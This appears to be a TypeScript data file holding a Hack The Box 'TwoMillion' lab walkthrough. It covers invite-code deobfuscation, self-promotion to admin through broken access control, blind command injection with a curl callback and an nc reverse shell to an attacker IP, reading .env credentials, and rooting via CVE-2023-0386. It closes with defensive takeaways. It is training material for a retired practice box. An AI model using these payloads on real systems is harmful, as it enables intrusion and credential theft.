import type { WalkthroughDoc } from "./types";

export const twomillion: WalkthroughDoc = {
  slug: "twomillion",
  name: "TwoMillion",
  platform: "Hack The Box",
  os: "Linux",
  difficulty: "Easy",
  retired: "Jun 2023",
  ip: "10.10.11.x",
  tags: [
    "Invite Code",
    "JS Deobfuscation",
    "API Abuse",
    "Broken Access Control",
    "Command Injection",
    "Password Reuse",
    "CVE-2023-0386",
  ],
  lede: "A nostalgic clone of the old Hack The Box front page hides a full API kill-chain: deobfuscate an invite-code script, forge a registration, flip your own `is_admin` flag through broken access control, land a blind command injection in the admin VPN generator, loot reused `.env` credentials, and ride CVE-2023-0386 OverlayFS to root.",
  summary:
    "Reverse an obfuscated invite flow, abuse a broken-access-control API to self-promote to admin, blind-inject the VPN generator for a shell, reuse .env creds over SSH, and OverlayFS (CVE-2023-0386) to root.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        { kind: "epigraph", text: "“2,000,000 hackers and counting.”" },
        {
          kind: "p",
          text: "**TwoMillion** is an Easy-rated Linux machine that HTB shipped to celebrate crossing two million members. The web front end is a faithful clone of the *old* Hack The Box platform — invite-code registration gate and all — and the whole box is a lesson in trusting the client too much and the server too little. Nothing here is exotic; it is a tidy stack of realistic web-app mistakes that compound into full root.",
        },
        {
          kind: "p",
          text: "Before we dig in, here is the complete route from an unauthenticated scan to a root shell:",
        },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**recon** — nmap → `2million.htb`",
            "**invite JS** — deobfuscate `inviteapi.min.js`",
            "**invite API** — ROT13 hint → base64 code",
            "**register + login** — enumerate `/api/v1`",
            "**broken access control** — `PUT .../settings/update` → `is_admin:1`",
            "**command injection** — `POST .../vpn/generate` → `www-data`",
            "**loot `.env`** — DB creds reused for system `admin`",
            "**ssh admin** — `user.txt`",
            "**CVE-2023-0386** — OverlayFS/FUSE → `root.txt`",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "Theme",
          text: "The site is an intentional replica of the legacy HTB UI, so the whole first act plays out inside an *API* rather than a browser. Treat every JSON error the server hands back as a hint — it is remarkably chatty about what it wants next.",
        },
      ],
    },
    {
      id: "recon",
      num: "01",
      title: "Enumeration",
      blocks: [
        { kind: "h3", text: "Port scan" },
        {
          kind: "p",
          text: "A full TCP sweep followed by a versioned scan of the open ports returns a minimal, modern surface: SSH and HTTP, nothing else.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ nmap -p- --min-rate 10000 -oA alltcp 10.10.11.221",
            "$ nmap -p22,80 -sCV -oA tcp 10.10.11.221",
            "PORT   STATE SERVICE VERSION",
            "22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)",
            "80/tcp open  http    nginx",
            "|_http-title: Did not follow redirect to http://2million.htb/",
          ],
        },
        {
          kind: "p",
          text: "nginx immediately issues a redirect to the virtual host `2million.htb`, so we add it to our hosts file before browsing — otherwise the site renders as a bare, broken page.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ echo '10.10.11.221 2million.htb' | sudo tee -a /etc/hosts",
            "$ curl -s http://2million.htb/ -I",
            "HTTP/1.1 200 OK",
            "Server: nginx",
          ],
        },
        {
          kind: "callout",
          variant: "tip",
          title: "Bank the fingerprint for later",
          text: "`OpenSSH 8.9p1 Ubuntu 3ubuntu0.1` pins the host at **Ubuntu 22.04** running kernel **5.15.70** — a modern-but-not-current kernel. That detail is irrelevant to the web foothold, but it is exactly what decides the privilege escalation at the end.",
        },
        {
          kind: "p",
          text: "With the vhost in place, `2million.htb` renders as a pixel-for-pixel copy of the old HTB landing page. The login page is a distraction; the interesting door is `/invite`, the classic invite-code registration gate.",
        },
      ],
    },
    {
      id: "invite-js",
      num: "02",
      title: "Deobfuscating the invite script",
      blocks: [
        {
          kind: "p",
          text: "Registration is gated behind an invite code we do not have. Viewing the source of `/invite` shows the page pulls in a minified script — `/js/inviteapi.min.js` — that defines a suggestively named function, `makeInviteCode()`. Client-side code is public code, so we pull it down and read it.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s http://2million.htb/js/inviteapi.min.js",
            "eval(function(p,a,c,k,e,d){...}('4 [...]',...))",
            "# minified + packed, but not encrypted — beautify it to read the flow",
          ],
        },
        {
          kind: "p",
          text: "The script is packed rather than protected. Running it through any JS beautifier (or simply typing `make` in the browser console to autocomplete `makeInviteCode` and stepping into it) exposes the logic in the clear: `makeInviteCode()` fires a `POST` at an API endpoint and returns whatever the server says.",
        },
        {
          kind: "code",
          lang: "javascript",
          label: "inviteapi.min.js (beautified)",
          lines: [
            "function verifyInviteCode(code) {",
            "  $.ajax({ type: 'POST', url: '/api/v1/invite/verify', data: { code }, ... });",
            "}",
            "function makeInviteCode() {",
            "  $.ajax({ type: 'POST', url: '/api/v1/invite/how/to/generate', ... });",
            "}",
          ],
          highlight: [4],
        },
        {
          kind: "callout",
          variant: "warn",
          title: "Obfuscation is not a control",
          text: "The whole invite flow is recoverable from the browser — the minifier only hides intent from a casual reader, never from an attacker. `makeInviteCode()` points us straight at `POST /api/v1/invite/how/to/generate`, which is where the real work happens.",
        },
      ],
    },
    {
      id: "invite-api",
      num: "03",
      title: "Forging an invite code",
      blocks: [
        {
          kind: "p",
          text: "We hit the endpoint the script revealed. The server answers with a JSON `hint`, but the `data` field is deliberately garbled — it is ROT13-encoded.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate | jq",
            "{",
            '  "0": 200,',
            '  "success": 1,',
            '  "data": {',
            '    "data": "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",',
            '    "enctype": "ROT13"',
            "  }",
            "}",
          ],
        },
        {
          kind: "p",
          text: "The response even labels its own `enctype`. We rotate it back to plaintext, which tells us the next endpoint to call.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s -X POST http://2million.htb/api/v1/invite/how/to/generate \\",
            "    | jq -r '.data.data' | tr 'A-Za-z' 'N-ZA-Mn-za-m'",
            "In order to generate the invite code, make a POST request to /api/v1/invite/generate",
          ],
          highlight: [2],
        },
        {
          kind: "p",
          text: "Now we call `/api/v1/invite/generate`. This one returns the code itself — but base64-encoded this time, a second layer of trivial encoding stacked on the first.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s -X POST http://2million.htb/api/v1/invite/generate | jq -r '.data.code'",
            "NFdMUjQtMDkwRUotTDVEM0UtV0NGWUA=",
            "$ echo 'NFdMUjQtMDkwRUotTDVEM0UtV0NGWUA=' | base64 -d",
            "4WLR4-090EJ-L5D3E-WCFY@",
          ],
          highlight: [3],
        },
        {
          kind: "callout",
          variant: "key",
          title: "Recovered",
          text: "A working invite code, e.g. `4WLR4-090EJ-L5D3E-WCFY@` (format `XXXXX-XXXXX-XXXXX-XXXXX`, regenerated per request). Two different encodings back to back — ROT13 on the hint, base64 on the code — trip people who expect one plaintext answer. Codes are per-instance, so generate a fresh one immediately before registering.",
        },
      ],
    },
    {
      id: "register",
      num: "04",
      title: "Register, log in, and map the API",
      blocks: [
        {
          kind: "p",
          text: "We paste the code into `/register`, create an ordinary account, and log in at `/login`. The session is tracked by a `PHPSESSID` cookie. Authenticated, we ask the API to describe itself — `GET /api/v1` returns a full map of every route the platform exposes.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# register at /register with the invite code, then log in at /login",
            "# grab the PHPSESSID cookie from the browser or your proxy",
            "$ curl -s http://2million.htb/api/v1 --cookie 'PHPSESSID=<sess>' | jq",
            "{",
            '  "v1": {',
            '    "user": { "GET": { "/api/v1": "Route List", ... } },',
            '    "admin": {',
            '      "GET":  { "/api/v1/admin/auth": "Check if user is admin" },',
            '      "POST": { "/api/v1/admin/vpn/generate": "Generate VPN for specific user" },',
            '      "PUT":  { "/api/v1/admin/settings/update": "Update settings" }',
            "    }",
            "  }",
            "}",
          ],
          highlight: [8, 9, 10],
        },
        {
          kind: "p",
          text: "The listing hands us the entire attack surface. Three `/api/v1/admin/*` routes stand out. First we confirm where we stand — are we admin? The dedicated endpoint says no.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s http://2million.htb/api/v1/admin/auth --cookie 'PHPSESSID=<sess>' | jq",
            '{ "message": false }',
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "The route list is the whole map",
          text: "You must be authenticated for `/api/v1` to enumerate. Note every `/admin/*` path — `settings/update` is a `PUT`, `vpn/generate` is a `POST`, `auth` is a `GET`. Getting the method wrong is the most common way to stall on the next two stages.",
        },
      ],
    },
    {
      id: "admin",
      num: "05",
      title: "Becoming admin via broken access control",
      blocks: [
        {
          kind: "p",
          text: "The `PUT /api/v1/admin/settings/update` endpoint is the classic broken-access-control flaw: it never checks that the *caller* is already an admin before letting them modify account settings — including their own `is_admin` flag. We just have to speak to it correctly. Probing with the wrong shape returns errors that walk us to the right request.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s http://2million.htb/api/v1/admin/settings/update \\",
            "    --cookie 'PHPSESSID=<sess>' -X PUT",
            '{ "status": "danger", "message": "Invalid content type." }',
            "# -> add JSON content-type; then it complains about a missing 'email', then 'is_admin'",
          ],
        },
        {
          kind: "p",
          text: "The server tells us exactly what it wants: a JSON body carrying our own `email` and an `is_admin` value. We supply the email tied to our session and flip the flag.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ curl -s http://2million.htb/api/v1/admin/settings/update \\",
            "    --cookie 'PHPSESSID=<sess>' -X PUT \\",
            "    --header 'Content-Type: application/json' \\",
            "    --data '{\"email\":\"you@2million.htb\",\"is_admin\":1}'",
            '{ "id": 14, "username": "you", "is_admin": 1 }',
            "$ curl -s http://2million.htb/api/v1/admin/auth --cookie 'PHPSESSID=<sess>' | jq",
            '{ "message": true }',
          ],
          highlight: [5, 7],
        },
        {
          kind: "callout",
          variant: "warn",
          title: "Three ways this silently fails",
          text: "The method must be **PUT** (not GET/POST); `Content-Type: application/json` is mandatory or the body is ignored; and `is_admin` must be the numeric **1**, not boolean `true` — some builds type-check it strictly and reject the boolean. The `email` also has to match the account bound to your `PHPSESSID`.",
        },
        {
          kind: "callout",
          variant: "key",
          title: "Recovered",
          text: "Administrator on the web app. `/api/v1/admin/auth` now returns `{\"message\": true}`, which unlocks the admin-only VPN generator — our path onto the box.",
        },
      ],
    },
    {
      id: "foothold",
      num: "06",
      title: "Foothold: blind command injection in the VPN generator",
      blocks: [
        {
          kind: "p",
          text: "With admin unlocked we can call `POST /api/v1/admin/vpn/generate`. Server-side, it shells out to an OpenVPN config-generation command and splices in the caller-supplied `username` with no sanitization. Any shell metacharacter — `;`, `&&`, backticks, `$()` — breaks out and runs as the web user, **www-data**. The catch: it is *blind*, returning no command output, so we confirm out-of-band before firing a shell.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# listener up first:  nc -lvnp 8888   (or python3 -m http.server 8888)",
            "$ curl -s http://2million.htb/api/v1/admin/vpn/generate \\",
            "    --cookie 'PHPSESSID=<sess>' -H 'Content-Type: application/json' \\",
            "    --data '{\"username\":\"a; curl 10.10.14.40:8888 #\"}'",
            "# a hit on the listener proves blind RCE as www-data",
          ],
        },
        {
          kind: "p",
          text: "The callback lands, so injection is confirmed. We swap the probe for a reverse shell and catch it. The trailing `#` comments out the rest of the intended `openvpn` command so our payload does not derail on the leftover arguments.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# catcher up first:  nc -lvnp 4444",
            "$ curl -s http://2million.htb/api/v1/admin/vpn/generate \\",
            "    --cookie 'PHPSESSID=<sess>' -H 'Content-Type: application/json' \\",
            "    --data '{\"username\":\"a; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.40 4444 >/tmp/f #\"}'",
            "",
            "# on the listener:",
            "$ nc -lvnp 4444",
            "www-data@2million:~/html$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            "www-data@2million:~/html$ id",
            "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
          ],
          highlight: [9, 10],
        },
        {
          kind: "callout",
          variant: "warn",
          title: "Admin-gated and blind",
          text: "A normal user gets `401`/forbidden on this route — the previous stage is a hard prerequisite. And because the injection returns nothing, always validate with an OOB `curl`/`ping` before wasting time on a shell that may not have fired. Keep the JSON content-type and the admin `PHPSESSID` on every request.",
        },
      ],
    },
    {
      id: "loot-env",
      num: "07",
      title: "Looting `.env` and pivoting to `admin`",
      blocks: [
        {
          kind: "p",
          text: "www-data is a foothold, not a user. The app is a Laravel-style PHP project, and those keep their secrets in a `.env` file at the web root. We read it and find database credentials sitting in plaintext.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "www-data@2million:~/html$ cat /var/www/html/.env",
            "DB_HOST=127.0.0.1",
            "DB_DATABASE=htb_prod",
            "DB_USERNAME=admin",
            "DB_PASSWORD=SuperDuperPass---",
          ],
          highlight: [3, 4],
        },
        {
          kind: "p",
          text: "There is a local system user `admin` on the box, and the database password is reused for it. We never actually need to touch MySQL — the credential *is* the pivot. We SSH straight in and grab our first flag.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "$ ssh admin@2million.htb",
            "admin@2million.htb's password: SuperDuperPass---",
            "admin@2million:~$ id",
            "uid=1000(admin) gid=1000(admin) groups=1000(admin)",
          ],
          highlight: [1],
        },
        {
          kind: "callout",
          variant: "key",
          title: "Recovered",
          text: "System credentials `admin : SuperDuperPass---` (note the three literal trailing dashes — dropping them is a classic self-own). Password reuse between the `htb_prod` database and the OS `admin` account turns an app compromise into an interactive SSH session.",
        },
        {
          kind: "callout",
          variant: "note",
          title: "Read your mail",
          text: "`/var/mail/admin` holds a story-driven note from `ch4p` about testing an OverlayFS kernel bug against the fleet. It is flavour text, but it is also foreshadowing — it points straight at the CVE we use for root.",
        },
      ],
    },
    {
      id: "user",
      num: "08",
      title: "`user.txt`",
      blocks: [
        {
          kind: "code",
          lang: "bash",
          lines: [
            "admin@2million:~$ cat /home/admin/user.txt",
            "76a8fc64····························",
          ],
          highlight: [1],
        },
        {
          kind: "p",
          text: "admin is an ordinary user with no obvious sudo rights — the way up is the kernel itself. The mail we just read already named the technique; now we make it real.",
        },
      ],
    },
    {
      id: "root",
      num: "09",
      title: "Privesc to root: CVE-2023-0386 (OverlayFS)",
      blocks: [
        {
          kind: "epigraph",
          text: "“The best backdoor is the one the vendor shipped.”",
        },
        {
          kind: "p",
          text: "Recall the recon fingerprint: Ubuntu 22.04 on kernel **5.15.70**. That kernel is vulnerable to **CVE-2023-0386**, a flaw in OverlayFS. When an unprivileged user copies a setuid-root file *up* through an overlay mount, the kernel preserves the file's root owner and setuid bit instead of dropping them. Backing the lower layer with a FUSE filesystem that presents a root-owned setuid binary lets us copy up a payload that then executes with root privileges — a reliable local root.",
        },
        {
          kind: "p",
          text: "The public xkaneiki PoC automates the mount dance. We build it *on the target* (gcc and make are present) so the binary matches the kernel and libc, then run the two-stage exploit: `./fuse` stages the FUSE-backed lower layer in the background, and `./exp` triggers the copy-up and drops a root shell.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "# on attacker: git clone https://github.com/xkaneiki/CVE-2023-0386",
            "# transfer to the box (scp, or wget from your http.server), then as admin:",
            "admin@2million:/tmp/CVE-2023-0386$ make all",
            "",
            "# terminal 1 — stage the FUSE mount and leave it running:",
            "admin@2million:/tmp/CVE-2023-0386$ ./fuse ./ovlcap/lower ./gc &",
            "",
            "# terminal 2 — trigger:",
            "admin@2million:/tmp/CVE-2023-0386$ ./exp",
            "root@2million:/tmp/CVE-2023-0386# id",
            "uid=0(root) gid=0(root) groups=0(root)",
          ],
          highlight: [9, 10],
        },
        {
          kind: "callout",
          variant: "warn",
          title: "Order and origin matter",
          text: "Compile *on the box* — a prebuilt binary from a mismatched distro usually fails. Start `./fuse` first and leave it backgrounded, *then* run `./exp` in a second shell; reversing the order breaks the exploit. CVE-2023-4911 (\"Looney Tunables\") is an alternate root path on this box, but OverlayFS is the intended one.",
        },
        {
          kind: "code",
          lang: "bash",
          lines: [
            "root@2million:~# cat /root/root.txt",
            "286204e3····························",
          ],
          highlight: [1],
        },
        {
          kind: "p",
          text: "Root secured. Fittingly for the anniversary theme, `/root` also holds a thank-you easter egg from the HTB team to its two million members. 🎉",
        },
      ],
    },
    {
      id: "defense",
      num: "10",
      title: "Defensive takeaways",
      blocks: [
        {
          kind: "ul",
          items: [
            "**Client-side obfuscation is not a control.** The entire invite flow — minified JS, ROT13, base64 — was recoverable from the browser. Treat all client code and any client-visible encoding as public; enforce gating server-side.",
            "**Authorize every privileged action server-side.** `settings/update` let a normal user set their own `is_admin` (OWASP API1/API5, broken access control + mass assignment). Check the caller's role on the server and never trust client-supplied `is_admin`/`role` fields.",
            "**Never concatenate user input into a shell.** The VPN generator spliced `username` into a system command. Use `exec`-style argument arrays or strict allow-lists instead of string building to eliminate command injection.",
            "**Keep secrets out of web-readable paths — and don't reuse them.** A readable `.env` leaked DB creds that also unlocked the system `admin` account. Segregate service and OS credentials so an app compromise can't become SSH access.",
            "**Patch the kernel promptly.** Kernel 5.15.70 left the host open to CVE-2023-0386. Unprivileged user namespaces + FUSE + an unpatched kernel is a dependable local root.",
            "**Blunt OverlayFS copy-up as defense-in-depth.** Where they aren't needed, restrict unprivileged user namespaces and FUSE to raise the bar on this whole exploit class.",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "Skills exercised",
          text: "JS deobfuscation · REST API enumeration · multi-layer encoding (ROT13/base64) · broken access control / mass assignment · blind OOB command injection · reverse-shell tradecraft · credential looting & password-reuse pivoting · CVE-2023-0386 OverlayFS kernel privilege escalation.",
        },
      ],
    },
  ],
};
